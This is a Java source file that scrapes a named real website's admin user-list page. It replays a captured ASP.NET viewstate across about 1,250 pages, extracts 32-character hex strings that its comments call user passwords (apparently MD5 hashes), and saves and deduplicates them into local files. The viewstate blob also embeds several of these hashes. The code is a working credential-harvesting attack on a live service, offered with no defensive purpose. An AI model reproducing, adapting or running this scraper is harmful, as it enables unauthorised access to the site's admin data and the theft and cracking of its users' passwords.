package com.maoji.huizhi.demo;

import cn.hutool.http.HttpUtil;
import com.maoji.huizhi.demo.commmon.utils.RegExtractUtil;

import java.io.*;
import java.util.*;


class User{
    public String name;
    public String password;
    public String role;

    public User(String name, String password, String role) {
        this.name = name;
        this.password = password;
        this.role = role;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public String getPassword() {
        return password;
    }

    public void setPassword(String password) {
        this.password = password;
    }

    public String getRole() {
        return role;
    }

    public void setRole(String role) {
        this.role = role;
    }
}

public class ks52user {
  // 匹配用户密码
  private static final String regEx_user = ">[A-Z\\d]{32}<";
  // 匹配权限
  private static final String regEx_role = "<span>[\\u4e00-\\u9fa5]{0,10}</span>";

  public static List<User> getUserList() throws InterruptedException {
    System.out.println("开始执行");
      //ArrayList<User> list = new ArrayList<>();
    for (int i = 652; i < 1906; i++) {
        //Thread.sleep(100);
        HashMap<String, Object> paramMap = new HashMap<>();
        paramMap.put("__EVENTTARGET","Pager");
        paramMap.put("__VIEWSTATEGENERATOR","621024FC");
        paramMap.put("Pager_input",2);
        paramMap.put("__EVENTARGUMENT",i);
        paramMap.put(
                "__VIEWSTATE",
        "/wEPDwUKMTg1NTA3MDYwNQ8WCh4FU29ydDEFAmlkHgVTb3J0MgUEREVTQx4IcGFnZXNpemUCFB4GcGFnZW5vAgEeBXdoZXJlBQMxPTEWAgIBD2QWBAIBDzwrAAsBAA8WCB4IRGF0YUtleXMWAB4LXyFJdGVtQ291bnQCFB4JUGFnZUNvdW50AgEeFV8hRGF0YVNvdXJjZUl0ZW1Db3VudAIUZBYCZg9kFigCAQ8PZBYEHgtvbm1vdXNlb3ZlcgUZdGhpcy5jbGFzc05hbWU9J0dyaWRNb3ZlJx4Kb25tb3VzZW91dAUZdGhpcy5jbGFzc05hbWU9J0dyaWRJdGVtJxYIZg9kFgJmDxUBBTQwMTYzZAIBD2QWAmYPDxYEHgRUZXh0BQQ1MmtzHgtOYXZpZ2F0ZVVybAUhYWRtaW5fZWRpdHVzZXIuYXNweD91c2VybmFtZT01MmtzZGQCAg8PFgIfCwUgMTc2MTQ5QkZENjA5NDYzMTIyQzVFQjAxOEM3QTU2RkZkZAIDD2QWAgIBDw8WAh8LBQnlhajnpoHmraJkZAICDw9kFgQfCQUZdGhpcy5jbGFzc05hbWU9J0dyaWRNb3ZlJx8KBRl0aGlzLmNsYXNzTmFtZT0nR3JpZEl0ZW0nFghmD2QWAmYPFQEFNDAxNjJkAgEPZBYCZg8PFgQfCwUENTJrcx8MBSFhZG1pbl9lZGl0dXNlci5hc3B4P3VzZXJuYW1lPTUya3NkZAICDw8WAh8LBSAwM0EwNDNGM0Y3MDE1MEI0RDc5REU4QUE0MjdDNEJEOWRkAgMPZBYCAgEPDxYCHwsFCeWFqOemgeatomRkAgMPD2QWBB8JBRl0aGlzLmNsYXNzTmFtZT0nR3JpZE1vdmUnHwoFGXRoaXMuY2xhc3NOYW1lPSdHcmlkSXRlbScWCGYPZBYCZg8VAQU0MDE2MWQCAQ9kFgJmDw8WBB8LBQQ1MmtzHwwFIWFkbWluX2VkaXR1c2VyLmFzcHg/dXNlcm5hbWU9NTJrc2RkAgIPDxYCHwsFIDY5OTIxRENFMUM0RDM4ODQwNjNFQTgzNUVDRDk2NTZFZGQCAw9kFgICAQ8PFgIfCwUJ5YWo56aB5q2iZGQCBA8PZBYEHwkFGXRoaXMuY2xhc3NOYW1lPSdHcmlkTW92ZScfCgUZdGhpcy5jbGFzc05hbWU9J0dyaWRJdGVtJxYIZg9kFgJmDxUBBTQwMTYwZAIBD2QWAmYPDxYEHwsFBDUya3MfDAUhYWRtaW5fZWRpdHVzZXIuYXNweD91c2VybmFtZT01MmtzZGQCAg8PFgIfCwUgODYwMjA0MkNCQThCQjVDMzg5RUQ3MzdBRkM1RUYxQjRkZAIDD2QWAgIBDw8WAh8LBQnlhajnpoHmraJkZAIFDw9kFgQfCQUZdGhpcy5jbGFzc05hbWU9J0dyaWRNb3ZlJx8KBRl0aGlzLmNsYXNzTmFtZT0nR3JpZEl0ZW0nFghmD2QWAmYPFQEFNDAxNTlkAgEPZBYCZg8PFgQfCwUENTJrcx8MBSFhZG1pbl9lZGl0dXNlci5hc3B4P3VzZXJuYW1lPTUya3NkZAICDw8WAh8LBSBBNjNBNTEwODZBNUFCRTY1MkZEMTgxNTU5RTI2NTU2Q2RkAgMPZBYCAgEPDxYCHwsFCeWFqOemgeatomRkAgYPD2QWBB8JBRl0aGlzLmNsYXNzTmFtZT0nR3JpZE1vdmUnHwoFGXRoaXMuY2xhc3NOYW1lPSdHcmlkSXRlbScWCGYPZBYCZg8VAQU0MDE1OGQCAQ9kFgJmDw8WBB8LBQQ1MmtzHwwFIWFkbWluX2VkaXR1c2VyLmFzcHg/dXNlcm5hbWU9NTJrc2RkAgIPDxYCHwsFIEU0Mzg2QzRDNDBDRjlBMDNEMDFEMkU5RUE5MDFEQ0VDZGQCAw9kFgICAQ8PFgIfCwUJ5YWo56aB5q2iZGQCBw8PZBYEHwkFGXRoaXMuY2xhc3NOYW1lPSdHcmlkTW92ZScfCgUZdGhpcy5jbGFzc05hbWU9J0dyaWRJdGVtJxYIZg9kFgJmDxUBBTQwMTU3ZAIBD2QWAmYPDxYEHwsFBDUya3MfDAUhYWRtaW5fZWRpdHVzZXIuYXNweD91c2VybmFtZT01MmtzZGQCAg8PFgIfCwUgMDk1OERGQ0U5QjQyREJEMDlCRUY5QTFEMzU5RTAzOUFkZAIDD2QWAgIBDw8WAh8LBQnlhajnpoHmraJkZAIIDw9kFgQfCQUZdGhpcy5jbGFzc05hbWU9J0dyaWRNb3ZlJx8KBRl0aGlzLmNsYXNzTmFtZT0nR3JpZEl0ZW0nFghmD2QWAmYPFQEFNDAxNTZkAgEPZBYCZg8PFgQfCwUENTJrcx8MBSFhZG1pbl9lZGl0dXNlci5hc3B4P3VzZXJuYW1lPTUya3NkZAICDw8WAh8LBSAwQTkzRjFGMDhBNDJGM0MyMTQ1Mzg2RjJCREVDNkRFMWRkAgMPZBYCAgEPDxYCHwsFCeWFqOemgeatomRkAgkPD2QWBB8JBRl0aGlzLmNsYXNzTmFtZT0nR3JpZE1vdmUnHwoFGXRoaXMuY2xhc3NOYW1lPSdHcmlkSXRlbScWCGYPZBYCZg8VAQU0MDE1NWQCAQ9kFgJmDw8WBB8LBQQ1MmtzHwwFIWFkbWluX2VkaXR1c2VyLmFzcHg/dXNlcm5hbWU9NTJrc2RkAgIPDxYCHwsFIDA1NTc0ODRFQjhDMTY2M0RCOTFCOTk3MjlFM0RFRTMxZGQCAw9kFgICAQ8PFgIfCwUJ5YWo56aB5q2iZGQCCg8PZBYEHwkFGXRoaXMuY2xhc3NOYW1lPSdHcmlkTW92ZScfCgUZdGhpcy5jbGFzc05hbWU9J0dyaWRJdGVtJxYIZg9kFgJmDxUBBTQwMTU0ZAIBD2QWAmYPDxYEHwsFBDUya3MfDAUhYWRtaW5fZWRpdHVzZXIuYXNweD91c2VybmFtZT01MmtzZGQCAg8PFgIfCwUgQkVBMDJEMjc5MTFGNjEyNkZGMUJDREJCNENCQTFCQzJkZAIDD2QWAgIBDw8WAh8LBQnlhajnpoHmraJkZAILDw9kFgQfCQUZdGhpcy5jbGFzc05hbWU9J0dyaWRNb3ZlJx8KBRl0aGlzLmNsYXNzTmFtZT0nR3JpZEl0ZW0nFghmD2QWAmYPFQEFNDAxNTNkAgEPZBYCZg8PFgQfCwUENTJrcx8MBSFhZG1pbl9lZGl0dXNlci5hc3B4P3VzZXJuYW1lPTUya3NkZAICDw8WAh8LBSAwMjI2MjEzMUUyMzI5RTI4NTQzREM5MjE0MjA5REM1NmRkAgMPZBYCAgEPDxYCHwsFCeWFqOemgeatomRkAgwPD2QWBB8JBRl0aGlzLmNsYXNzTmFtZT0nR3JpZE1vdmUnHwoFGXRoaXMuY2xhc3NOYW1lPSdHcmlkSXRlbScWCGYPZBYCZg8VAQU0MDE1MmQCAQ9kFgJmDw8WBB8LBQQ1MmtzHwwFIWFkbWluX2VkaXR1c2VyLmFzcHg/dXNlcm5hbWU9NTJrc2RkAgIPDxYCHwsFIEVGOEUwQTk3Q0ZGOTQwOEM5NUE0RjcxQkNBNTU2RDgyZGQCAw9kFgICAQ8PFgIfCwUJ5YWo56aB5q2iZGQCDQ8PZBYEHwkFGXRoaXMuY2xhc3NOYW1lPSdHcmlkTW92ZScfCgUZdGhpcy5jbGFzc05hbWU9J0dyaWRJdGVtJxYIZg9kFgJmDxUBBTQwMTUxZAIBD2QWAmYPDxYEHwsFBDUya3MfDAUhYWRtaW5fZWRpdHVzZXIuYXNweD91c2VybmFtZT01MmtzZGQCAg8PFgIfCwUgMzNDNUMwMjBGMTcwQkM0OTlCMDkyRDkzRDdCQTI2MThkZAIDD2QWAgIBDw8WAh8LBQnlhajnpoHmraJkZAIODw9kFgQfCQUZdGhpcy5jbGFzc05hbWU9J0dyaWRNb3ZlJx8KBRl0aGlzLmNsYXNzTmFtZT0nR3JpZEl0ZW0nFghmD2QWAmYPFQEFNDAxNTBkAgEPZBYCZg8PFgQfCwUENTJrcx8MBSFhZG1pbl9lZGl0dXNlci5hc3B4P3VzZXJuYW1lPTUya3NkZAICDw8WAh8LBSA5MEZGNzk2QTBCRUQ1NDA0MEVGRkI4MkFDNTAwOUMxMGRkAgMPZBYCAgEPDxYCHwsFCeWFqOemgeatomRkAg8PD2QWBB8JBRl0aGlzLmNsYXNzTmFtZT0nR3JpZE1vdmUnHwoFGXRoaXMuY2xhc3NOYW1lPSdHcmlkSXRlbScWCGYPZBYCZg8VAQU0MDE0OWQCAQ9kFgJmDw8WBB8LBQQ1MmtzHwwFIWFkbWluX2VkaXR1c2VyLmFzcHg/dXNlcm5hbWU9NTJrc2RkAgIPDxYCHwsFIDlGOUJCRDU3MUYxRDQyQzQxN0Q3OTBDNzU0NTczNTc1ZGQCAw9kFgICAQ8PFgIfCwUJ5YWo56aB5q2iZGQCEA8PZBYEHwkFGXRoaXMuY2xhc3NOYW1lPSdHcmlkTW92ZScfCgUZdGhpcy5jbGFzc05hbWU9J0dyaWRJdGVtJxYIZg9kFgJmDxUBBTQwMTQ4ZAIBD2QWAmYPDxYEHwsFBDUya3MfDAUhYWRtaW5fZWRpdHVzZXIuYXNweD91c2VybmFtZT01MmtzZGQCAg8PFgIfCwUgQTM4MzhFQkYyOUNFNThDN0U1MkU4NUQ1NTEzRUYwMDVkZAIDD2QWAgIBDw8WAh8LBQnlhajnpoHmraJkZAIRDw9kFgQfCQUZdGhpcy5jbGFzc05hbWU9J0dyaWRNb3ZlJx8KBRl0aGlzLmNsYXNzTmFtZT0nR3JpZEl0ZW0nFghmD2QWAmYPFQEFNDAxNDdkAgEPZBYCZg8PFgQfCwUENTJrcx8MBSFhZG1pbl9lZGl0dXNlci5hc3B4P3VzZXJuYW1lPTUya3NkZAICDw8WAh8LBSAwOTc4RTFBNjUxQ0VGRkE3RDkzMjlBQzFGRjdDRUI4NmRkAgMPZBYCAgEPDxYCHwsFCeWFqOemgeatomRkAhIPD2QWBB8JBRl0aGlzLmNsYXNzTmFtZT0nR3JpZE1vdmUnHwoFGXRoaXMuY2xhc3NOYW1lPSdHcmlkSXRlbScWCGYPZBYCZg8VAQU0MDE0NmQCAQ9kFgJmDw8WBB8LBQQ1MmtzHwwFIWFkbWluX2VkaXR1c2VyLmFzcHg/dXNlcm5hbWU9NTJrc2RkAgIPDxYCHwsFIEU2OTQ2Mzk1N0QyODVFQzE1MTg1QTA3MzU4QTNEOEYwZGQCAw9kFgICAQ8PFgIfCwUJ5YWo56aB5q2iZGQCEw8PZBYEHwkFGXRoaXMuY2xhc3NOYW1lPSdHcmlkTW92ZScfCgUZdGhpcy5jbGFzc05hbWU9J0dyaWRJdGVtJxYIZg9kFgJmDxUBBTQwMTQ1ZAIBD2QWAmYPDxYEHwsFBDUya3MfDAUhYWRtaW5fZWRpdHVzZXIuYXNweD91c2VybmFtZT01MmtzZGQCAg8PFgIfCwUgODRGNTA3OTU4OTFDN0VBQ0MzM0ZCQTIwQjlFODUzNjNkZAIDD2QWAgIBDw8WAh8LBQnlhajnpoHmraJkZAIUDw9kFgQfCQUZdGhpcy5jbGFzc05hbWU9J0dyaWRNb3ZlJx8KBRl0aGlzLmNsYXNzTmFtZT0nR3JpZEl0ZW0nFghmD2QWAmYPFQEFNDAxNDRkAgEPZBYCZg8PFgQfCwUENTJrcx8MBSFhZG1pbl9lZGl0dXNlci5hc3B4P3VzZXJuYW1lPTUya3NkZAICDw8WAh8LBSBCQ0EyNUY0QzI0NzQ5QTJCOTMxMTE5MjA4RkM5OTZDRmRkAgMPZBYCAgEPDxYCHwsFCeWFqOemgeatomRkAgMPDxYGHghQYWdlU2l6ZQIUHgtSZWNvcmRjb3VudALQqQIeDkN1c3RvbUluZm9UZXh0BV7lhbE8Zm9udCBjb2xvcj0iYmx1ZSI+PGI+MzgwOTY8L2I+PC9mb250PuadoeiusOW9lSDlhbE8Zm9udCBjb2xvcj0iYmx1ZSI+PGI+MTkwNTwvYj48L2ZvbnQ+6aG1ZGRkVunCON+qK/bo3Ktn88pgdFuHEnU=");
        String result = HttpUtil.post("http://www.5252ks.com/admin/admin_otherlogin.aspx", paramMap);
        // 提取用户密码
        List<String> passwords = RegExtractUtil.extractMessage(regEx_user, result);
        // 提取权限
        //List<String> roles = RegExtractUtil.extractMessage(regEx_role, result);

      for (int j = 0; j < passwords.size(); j++) {
          String user = passwords.get(j).substring(passwords.get(j).indexOf('>') + 1, passwords.get(j).indexOf('<'));
          //String role = roles.get(j).substring(6, roles.get(j).length()-7);
        System.out.println(user);
          /*list.add(new User("52ks",user,role));*/
          FileWriter fw = null;
          try {
//如果文件存在，则追加内容；如果文件不存在，则创建文件

              /*"E:\personalitydic.txt"*/
              File f=new File("G:\\password.txt");
              fw = new FileWriter(f, true);//true,进行追加写。
          } catch (IOException e) {
              e.printStackTrace();
          }
          PrintWriter pw = new PrintWriter(fw);
          pw.println(user);
          pw.flush();
          try {
              fw.flush();
              pw.close();
              fw.close();
          } catch (IOException e) {
              e.printStackTrace();
          }


      }





        System.out.println("执行完第"+i+"页");
    }
      //System.out.println(list.size());
      return null;

    }
  public static void main(String[] args) throws InterruptedException {
      //List<User> userList = getUserList();

     Set<String> strings = new HashSet<>();
      File file = new File("G:\\password.txt");
      BufferedReader reader = null;
      try {
          System.out.println("以行为单位读取文件内容，一次读一整行：");
          reader = new BufferedReader(new FileReader(file));
          String tempString = null;
          int line = 1;
          // 一次读入一行，直到读入null为文件结束
          while ((tempString = reader.readLine()) != null) {
              // 显示行号
              strings.add(tempString);
              System.out.println(tempString);
              line++;
          }
          reader.close();
      } catch (IOException e) {
          e.printStackTrace();
      } finally {
          Thread.sleep(1000);
      System.out.println("---------------------");
      System.out.println(strings.size());
      for (String string : strings) {
        System.out.println(string);
      }
          if (reader != null) {
              try {
                  reader.close();
              } catch (IOException e1) {
              }
          }
      }

    // 写入
    for (String string : strings) {
      //


          System.out.println(string);
          /*list.add(new User("52ks",user,role));*/
          FileWriter fw = null;
          try {
//如果文件存在，则追加内容；如果文件不存在，则创建文件

              /*"E:\personalitydic.txt"*/
              File f=new File("G:\\passwordset1.txt");
              fw = new FileWriter(f, true);//true,进行追加写。
          } catch (IOException e) {
              e.printStackTrace();
          }
          PrintWriter pw = new PrintWriter(fw);
          pw.println(string);
          pw.flush();
          try {
              fw.flush();
              pw.close();
              fw.close();
          } catch (IOException e) {
              e.printStackTrace();
          }
}

      }

  }
